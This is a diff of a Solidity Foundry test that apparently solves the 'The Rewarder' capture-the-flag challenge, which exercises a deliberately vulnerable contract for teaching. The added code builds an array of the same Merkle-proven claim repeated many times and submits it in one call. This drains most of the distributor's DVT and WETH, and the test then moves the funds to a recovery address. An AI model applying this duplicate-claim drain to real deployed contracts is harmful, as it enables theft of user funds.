@@ -14,7 +14,7 @@ contract TheRewarderChallenge is Test {
     address alice = makeAddr("alice");
     address recovery = makeAddr("recovery");
 
-    uint256 constant BENEFICIARIES_AMOUNT = 1000;
+    uint256 constant BENEFICIARIES_AMOUNT = 1000; // 1000 leafs on tree
     uint256 constant TOTAL_DVT_DISTRIBUTION_AMOUNT = 10 ether;
     uint256 constant TOTAL_WETH_DISTRIBUTION_AMOUNT = 1 ether;
 
@@ -147,8 +147,60 @@ contract TheRewarderChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_theRewarder() public checkSolvedByPlayer {
+    function test_theRewarder() public 
+    checkSolvedByPlayer 
+    {
+        //// Constants and claims
+        uint256 claimAmountDVT = 11524763827831882; // took from json
+        uint256 claimAmountWeth = 1171088749244340; // took from json
+        uint256 leaveIndexDVT = 188; // took from json
+        uint256 leaveIndexWeth = 188; // took from json
+        bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
+        bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
+
+        Claim memory dvtClaim = Claim({
+            batchNumber: 0, 
+            amount: claimAmountDVT,
+            tokenIndex: 0, 
+            proof: merkle.getProof(dvtLeaves, leaveIndexDVT)
+        });
+
+        Claim memory wethClaim = Claim({
+            batchNumber: 0,
+            amount: claimAmountWeth,
+            tokenIndex: 1, 
+            proof: merkle.getProof(wethLeaves, leaveIndexWeth)
+        });
+
+        //// Count how many times could we repeat the same claim
+        uint256 dvtCount; 
+        while (dvtCount*claimAmountDVT < TOTAL_DVT_DISTRIBUTION_AMOUNT) dvtCount++;
+        uint256 wethCount; 
+        while (wethCount*claimAmountWeth < TOTAL_WETH_DISTRIBUTION_AMOUNT) wethCount++;
         
+        // substract 1 cause the while stops AFTER passing the max multiple
+        dvtCount--;
+        wethCount--;
+
+        //// creating claims array
+        Claim[] memory claims = new Claim[](dvtCount+wethCount);
+
+        for(uint256 i = 0; i<claims.length; i++){
+            if(i<dvtCount) claims[i] = dvtClaim;
+            else claims[i] = wethClaim;
+        }
+
+        ///// Set DVT and WETH as tokens to claim
+        IERC20[] memory tokensToClaim = new IERC20[](2);
+        tokensToClaim[0] = IERC20(address(dvt));
+        tokensToClaim[1] = IERC20(address(weth));
+
+        //// Claim
+        distributor.claimRewards({inputClaims: claims, inputTokens: tokensToClaim});
+
+        // transfer to recovery
+        dvt.transfer(recovery, dvt.balanceOf(player));
+        weth.transfer(recovery, weth.balanceOf(player));
     }
 
     /**
